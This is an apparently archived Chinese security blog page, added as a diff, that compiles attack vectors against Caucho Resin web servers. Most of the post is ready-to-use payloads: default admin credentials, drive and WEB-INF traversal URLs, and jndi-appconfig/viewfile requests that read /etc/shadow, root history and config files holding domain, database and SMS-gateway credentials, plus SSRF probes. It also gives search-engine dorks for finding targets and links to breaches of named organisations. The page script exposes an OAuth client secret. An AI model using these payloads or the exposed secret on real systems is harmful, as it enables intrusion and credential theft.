@@ -1,0 +1,663 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>针对Resin服务的攻击向量整理</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《针对Resin服务的攻击向量整理》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		3/12/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2019/02/17/针对Resin服务的攻击向量整理/" itemprop="url">		
+			针对Resin服务的攻击向量整理		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2019/02/17/针对Resin服务的攻击向量整理/" itemprop="url">
+	<time datetime="2019-02-17T06:53:15.750Z" itemprop="datePublished">
+  		2019-02-17
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="针对Resin服务的攻击向量整理"><a href="#针对Resin服务的攻击向量整理" class="headerlink" title="针对Resin服务的攻击向量整理"></a>针对Resin服务的攻击向量整理</h2><h3 id="0x00-弱口令"><a href="#0x00-弱口令" class="headerlink" title="0x00 弱口令"></a>0x00 弱口令</h3><blockquote>
+<ol>
+<li><a href="http://victim.com/resin-admin/" target="_blank" rel="noopener">http://victim.com/resin-admin/</a></li>
+<li><a href="http://victim.com/resin-admin/status.php" target="_blank" rel="noopener">http://victim.com/resin-admin/status.php</a></li>
+<li>admin/admin</li>
+</ol>
+</blockquote>
+<h3 id="0x01-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><a href="#0x01-CVE-2006-1953-Resin-Windows远程目录遍历漏洞" class="headerlink" title="0x01 CVE-2006-1953 Resin Windows远程目录遍历漏洞"></a>0x01 CVE-2006-1953 Resin Windows远程目录遍历漏洞</h3><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><blockquote>
+<ol>
+<li><a href="https://www.rapid7.com/resources/advisories/R7-0024.jsp" target="_blank" rel="noopener">https://www.rapid7.com/resources/advisories/R7-0024.jsp</a></li>
+<li><a href="http://www.nsfocus.net/vulndb/8829" target="_blank" rel="noopener">http://www.nsfocus.net/vulndb/8829</a></li>
+</ol>
+</blockquote>
+<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>受影响系统：</p>
+<blockquote>
+<p>Caucho Technology Resin v3.0.18 for Windows<br>Caucho Technology Resin v3.0.17 for Windows</p>
+</blockquote>
+<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><blockquote>
+<p><a href="http://victim.com/C:%5C/" target="_blank" rel="noopener">http://victim.com/C:%5C/</a><br><a href="http://victim.com/D:%5C/" target="_blank" rel="noopener">http://victim.com/D:%5C/</a><br><a href="http://victim.com/E:%5C/" target="_blank" rel="noopener">http://victim.com/E:%5C/</a><br><a href="http://victim.com/F:%5C/" target="_blank" rel="noopener">http://victim.com/F:%5C/</a></p>
+</blockquote>
+<h3 id="0x02-Resin-20任意文件读取"><a href="#0x02-Resin-20任意文件读取" class="headerlink" title="0x02 Resin %20任意文件读取"></a>0x02 Resin %20任意文件读取</h3><blockquote>
+<p><a href="http://webscan.360.cn/vul/view/vulid/3528" target="_blank" rel="noopener">http://webscan.360.cn/vul/view/vulid/3528</a></p>
+</blockquote>
+<h4 id="Resin-Windows-漏洞"><a href="#Resin-Windows-漏洞" class="headerlink" title="Resin Windows 漏洞"></a>Resin Windows 漏洞</h4><p><strong>漏洞描述</strong></p>
+<p>Resin for Windows实现上存在多个漏洞，远程攻击者可能利用此漏洞非授权获取敏感信息。<br>Resin 没有正确过滤通过URL传送的输入，</p>
+<p>允许远程攻击者通过在URL中提供有任意扩展名的 DOS 设备文件名从系统上的任意 COM 或 LPT设备读取连续的数据流、</p>
+<p>通过目录遍历攻击泄露Web应用的WEB-INF目录中的文件内容，或通过包含有特殊字符的URL泄露到Caucho Resin服务器的完整系统路径。</p>
+<p><strong>影响范围</strong></p>
+<blockquote>
+<ol>
+<li>Caucho Resin Professional v3.1.0 for Windows</li>
+<li>Caucho Resin v3.1.0 for Windows</li>
+<li>Caucho Resin v3.0.21 for Windows</li>
+<li>Caucho Resin v3.0.20 for Windows</li>
+<li>Caucho Resin v3.0.19 for Windows</li>
+<li>Caucho Resin v3.0.18 for Windows</li>
+<li>Caucho Resin v3.0.17 for Windows</li>
+<li>KNOWN FIXED:</li>
+<li>Caucho Resin v3.1.1 for Windows</li>
+<li>Caucho Resin Professional v3.1.1 for Windows</li>
+</ol>
+</blockquote>
+<p><strong>测试代码</strong></p>
+<blockquote>
+<ol>
+<li><a href="http://www.example.com:8080/[path]/[device].[extension]" target="_blank" rel="noopener">http://www.example.com:8080/[path]/[device].[extension]</a></li>
+<li><a href="http://www.example.com:8080/%20../web-inf" target="_blank" rel="noopener">http://www.example.com:8080/%20../web-inf</a></li>
+<li><a href="http://www.example.com:8080/%20" target="_blank" rel="noopener">http://www.example.com:8080/%20</a></li>
+<li><a href="http://www.example.com:8080/[path]/%20.xtp" target="_blank" rel="noopener">http://www.example.com:8080/[path]/%20.xtp</a></li>
+</ol>
+</blockquote>
+<p><strong>漏洞危害</strong></p>
+<p>通过此漏洞可以读取到串口设备的信息以及网站任意目录的文件遍历。</p>
+<h3 id="0x03-Resin-jndi-appconfig-inputFile-任意文件读取-SSRF"><a href="#0x03-Resin-jndi-appconfig-inputFile-任意文件读取-SSRF" class="headerlink" title="0x03 Resin jndi-appconfig inputFile 任意文件读取/SSRF"></a>0x03 Resin jndi-appconfig inputFile 任意文件读取/SSRF</h3><p>略，之后补充payloads</p>
+<blockquote>
+<ol>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/shadow</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/opt/nginx/conf/nginx.conf</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/sysconfig/network-scripts/ifcfg-eth1</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=~/.bashrc_history</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bashrc_history</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/opt/www/nagios/WEB-INF/nagios.conf</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/opt/nagios/etc/hostgroup.cfg</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</li>
+</ol>
+</blockquote>
+<h3 id="0x04-Resin-viewfile-任意文件读取"><a href="#0x04-Resin-viewfile-任意文件读取" class="headerlink" title="0x04 Resin viewfile 任意文件读取"></a>0x04 Resin viewfile 任意文件读取</h3><p>略，之后补充payloads</p>
+<blockquote>
+<ol>
+<li>/resin-doc/viewfile/?file=index.jsp</li>
+<li>/resin-doc/viewfile/?file=config.xml</li>
+<li>/resin-doc/viewfile/?file=WEB-INF/web.xml</li>
+<li>/resin-doc/viewfile/?file=WEB-INF/resin-web.xml</li>
+<li>/resin-doc/viewfile/?file=css/default.css</li>
+<li>/resin-doc/viewfile/?file=examples/amber-session/WEB-INF/classes/example/User.java</li>
+<li>/resin-doc/viewfile/?file=images/hbleed.gif</li>
+</ol>
+</blockquote>
+<h3 id="0x10-Payloads"><a href="#0x10-Payloads" class="headerlink" title="0x10 Payloads"></a>0x10 Payloads</h3><blockquote>
+<ol>
+<li>/usr/local/resin/conf/resin.conf</li>
+<li>基类Payload</li>
+<li>/resin-doc/viewfile/?file=/WEB-INF/web.xml</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=远端服务器(Ceye)/内网IP</li>
+<li>/%20../WEB-INF/</li>
+<li>弱口令</li>
+<li>/resin-admin/status.php</li>
+<li>衍生Payload</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/hosts</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/shadow</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/opt/nginx/conf/nginx.conf</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/sysconfig/network-scripts/ifcfg-eth1</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=~/.bashrc_history</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/root/.bashrc_history</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/opt/www/nagios/WEB-INF/nagios.conf</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/opt/nagios/etc/hostgroup.cfg</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd</li>
+<li>/resin-doc/viewfile/?file=/WEB-INF/web.xml</li>
+<li>/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=fakefile.xml</li>
+<li>/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=/etc/hosts</li>
+<li>/resin-doc/viewfile/?contextpath=/&amp;servletpath=&amp;file=/etc/shadow</li>
+<li>/resin-doc/viewfile/?contextpath=/otherwebapp&amp;servletpath=&amp;file=WEB-INF/web.xml</li>
+<li>/resin-doc/viewfile/?contextpath=./&amp;servletpath=&amp;file=WEB-INF/web.xml</li>
+<li>/resin-doc/viewfile/?contextpath=C:\&amp;servletpath=&amp;file=boot.ini</li>
+<li>/resin-doc/viewfile/?file=index.jsp</li>
+<li>/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp</li>
+<li>/resin-doc/examples/jndi-appconfig/test?inputFile=C:\Windows\system.ini</li>
+<li>针对金蝶的payload</li>
+<li>/kingdee/%20../web-inf/</li>
+<li>/kingdee/%20../editor/</li>
+<li>/kingdee/%20../disk/</li>
+<li>AD域服务器帐号密码(可能未配置)</li>
+<li>/kingdee/%20../web-inf/classes/ad_config.conf  </li>
+<li>ctop数据库帐号密码</li>
+<li>/kingdee/%20../web-inf/classes/ctop.conf</li>
+<li>短信网关</li>
+<li>/kingdee/%20../web-inf/classes/sms_config.conf</li>
+<li>金蝶变形</li>
+<li>/ctop/%20../web-inf/</li>
+<li>潜在的绕过</li>
+<li>/%20../web-inf/</li>
+<li>/%20../WEB-INF/</li>
+<li>潜在的SSRF</li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=<a href="http://10.0.201.75" target="_blank" rel="noopener">http://10.0.201.75</a></li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=<a href="https://www.secpulse.com/robots.txt" target="_blank" rel="noopener">https://www.secpulse.com/robots.txt</a></li>
+<li>/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=远端服务器(Ceye)</li>
+<li>CVE-2006-1953</li>
+<li>/A:%5C/</li>
+<li>/B:%5C/</li>
+<li>/C:%5C/</li>
+<li>/D:%5C/</li>
+<li>/E:%5C/</li>
+<li>/F:%5C/</li>
+<li>/G:%5C/</li>
+<li>/H:%5C/</li>
+</ol>
+</blockquote>
+<h3 id="0x11案例"><a href="#0x11案例" class="headerlink" title="0x11案例"></a>0x11案例</h3><h4 id="主要流行时间"><a href="#主要流行时间" class="headerlink" title="主要流行时间"></a>主要流行时间</h4><p>15年6月-15年12月</p>
+<blockquote>
+<ol>
+<li><a href="https://web.archive.org/web/20130915134701/https://www.rapid7.com/resources/advisories/R7-0028.jsp" target="_blank" rel="noopener">https://web.archive.org/web/20130915134701/https://www.rapid7.com/resources/advisories/R7-0028.jsp</a></li>
+<li><a href="https://www.rapid7.com/resources/advisories/R7-0028.jsp" target="_blank" rel="noopener">https://www.rapid7.com/resources/advisories/R7-0028.jsp</a></li>
+<li><a href="https://www.rapid7.com/resources/advisories/R7-0029.jsp" target="_blank" rel="noopener">https://www.rapid7.com/resources/advisories/R7-0029.jsp</a></li>
+<li><a href="https://www.rapid7.com/resources/advisories/R7-0030.jsp" target="_blank" rel="noopener">https://www.rapid7.com/resources/advisories/R7-0030.jsp</a></li>
+</ol>
+</blockquote>
+<h4 id="a-20-任意文件读取"><a href="#a-20-任意文件读取" class="headerlink" title="a. %20 任意文件读取"></a>a. %20 任意文件读取</h4><p>Resin漏洞利用案例之目录遍历/以金蝶某系统为例</p>
+<p><a href="https://www.secpulse.com/archives/39144.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/39144.html</a></p>
+<p>中国人寿某站存在resin目录遍历漏洞导致内部多数据库信息泄露</p>
+<p><a href="https://www.secpulse.com/archives/41485.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/41485.html</a></p>
+<h4 id="b-jndi-appconfig-inputFile-任意文件读取-SSRF"><a href="#b-jndi-appconfig-inputFile-任意文件读取-SSRF" class="headerlink" title="b. jndi-appconfig inputFile 任意文件读取/SSRF"></a>b. jndi-appconfig inputFile 任意文件读取/SSRF</h4><p>和讯网某分站resin任意文件读取附赠xss一枚</p>
+<p><a href="https://www.secpulse.com/archives/37175.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/37175.html</a></p>
+<p>和讯网某站点任意文件读取和SSRF漏洞</p>
+<p><a href="https://www.secpulse.com/archives/34659.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/34659.html</a></p>
+<p>21CN某站点站点任意文件读取和SSRF漏洞可探测内网（resin成功利用案例）</p>
+<p><a href="https://www.secpulse.com/archives/40166.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/40166.html</a></p>
+<h4 id="c-viewfile-任意文件读取"><a href="#c-viewfile-任意文件读取" class="headerlink" title="c. viewfile 任意文件读取"></a>c. viewfile 任意文件读取</h4><p>58同城漏洞大集合(任意上传，Resin远程文件等)</p>
+<p><a href="https://www.secpulse.com/archives/15056.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/15056.html</a></p>
+<p>百合网从Resin文件读取到webshell</p>
+<p><a href="https://www.secpulse.com/archives/14755.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/14755.html</a></p>
+<p>爱奇艺Resin配置漏洞</p>
+<p><a href="https://www.secpulse.com/archives/13485.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/13485.html</a></p>
+<p>搜狐网Resin配置漏洞，导致敏感信息泄露</p>
+<p><a href="https://www.secpulse.com/archives/12074.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/12074.html</a></p>
+<p>南方电网国际resin任意文件读取</p>
+<p><a href="https://www.secpulse.com/archives/9536.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/9536.html</a></p>
+<h4 id="d-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><a href="#d-CVE-2006-1953-Resin-Windows远程目录遍历漏洞" class="headerlink" title="d. CVE-2006-1953 Resin Windows远程目录遍历漏洞"></a>d. CVE-2006-1953 Resin Windows远程目录遍历漏洞</h4><p>Resin漏洞利用案例之Windows全盘遍历漏洞（以某省戒毒所为例）</p>
+<p><a href="https://www.secpulse.com/archives/37313.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/37313.html</a></p>
+<p>万户OA</p>
+<p>万户网络Resin版本过低导致客户网站磁盘信息泄露</p>
+<p><a href="https://www.secpulse.com/archives/30621.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/30621.html</a></p>
+<p>万户网络技建站使用中间件Resin版本过低导致众多客户网站磁盘信息泄露</p>
+<p><a href="https://www.secpulse.com/archives/20697.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/20697.html</a></p>
+<h4 id="e-弱口令"><a href="#e-弱口令" class="headerlink" title="e. 弱口令"></a>e. 弱口令</h4><p>人人网多个Resin弱口令</p>
+<p><a href="https://www.secpulse.com/archives/29247.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/29247.html</a></p>
+<p>17173两个站点Resin存在弱口令</p>
+<p><a href="https://www.secpulse.com/archives/24364.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/24364.html</a></p>
+<h3 id="0x12-自动化目标方案"><a href="#0x12-自动化目标方案" class="headerlink" title="0x12 自动化目标方案"></a>0x12 自动化目标方案</h3><blockquote>
+<ol>
+<li>inurl:jndi-appconfig/test</li>
+<li>Shadon</li>
+<li>FOFA/Zoomeye</li>
+</ol>
+</blockquote>
+<h3 id="0x13-补充"><a href="#0x13-补充" class="headerlink" title="0x13 补充"></a>0x13 补充</h3><p>Ceye</p>
+<p>HTTP盲攻击接收/可视化</p>
+<p>可以参考 Cplushua(宫华) 的 HTTP 盲攻击 (Freebuf公开课)</p>
+<p>这里的盲攻击指的是无回显的攻击。</p>
+<p><a href="http://ceye.io/record/index" target="_blank" rel="noopener">http://ceye.io/record/index</a></p>
+<p><a href="https://sso.telnet404.com/cas/login?service=http%3A%2F%2Fceye.io%2Flogin%2F" target="_blank" rel="noopener">https://sso.telnet404.com/cas/login?service=http%3A%2F%2Fceye.io%2Flogin%2F</a></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2019/02/17/PHP代码审计中的常见套路 检查相等时的漏洞/" title="PHP代码审计中的常见套路 检查相等时的漏洞">
+      		&laquo; 上一篇
+		</a>
+		</li>
+	
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2019/02/16/隐写术-深入研究PDF混淆漏洞/" title="隐写术-深入研究PDF混淆漏洞">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#针对Resin服务的攻击向量整理"><span class="post-toc-text">针对Resin服务的攻击向量整理</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x00-弱口令"><span class="post-toc-text">0x00 弱口令</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x01-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><span class="post-toc-text">0x01 CVE-2006-1953 Resin Windows远程目录遍历漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#参考资料"><span class="post-toc-text">参考资料</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#影响范围"><span class="post-toc-text">影响范围</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#测试代码"><span class="post-toc-text">测试代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x02-Resin-20任意文件读取"><span class="post-toc-text">0x02 Resin %20任意文件读取</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Resin-Windows-漏洞"><span class="post-toc-text">Resin Windows 漏洞</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x03-Resin-jndi-appconfig-inputFile-任意文件读取-SSRF"><span class="post-toc-text">0x03 Resin jndi-appconfig inputFile 任意文件读取/SSRF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x04-Resin-viewfile-任意文件读取"><span class="post-toc-text">0x04 Resin viewfile 任意文件读取</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x10-Payloads"><span class="post-toc-text">0x10 Payloads</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x11案例"><span class="post-toc-text">0x11案例</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#主要流行时间"><span class="post-toc-text">主要流行时间</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#a-20-任意文件读取"><span class="post-toc-text">a. %20 任意文件读取</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#b-jndi-appconfig-inputFile-任意文件读取-SSRF"><span class="post-toc-text">b. jndi-appconfig inputFile 任意文件读取/SSRF</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#c-viewfile-任意文件读取"><span class="post-toc-text">c. viewfile 任意文件读取</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#d-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><span class="post-toc-text">d. CVE-2006-1953 Resin Windows远程目录遍历漏洞</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#e-弱口令"><span class="post-toc-text">e. 弱口令</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x12-自动化目标方案"><span class="post-toc-text">0x12 自动化目标方案</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x13-补充"><span class="post-toc-text">0x13 补充</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
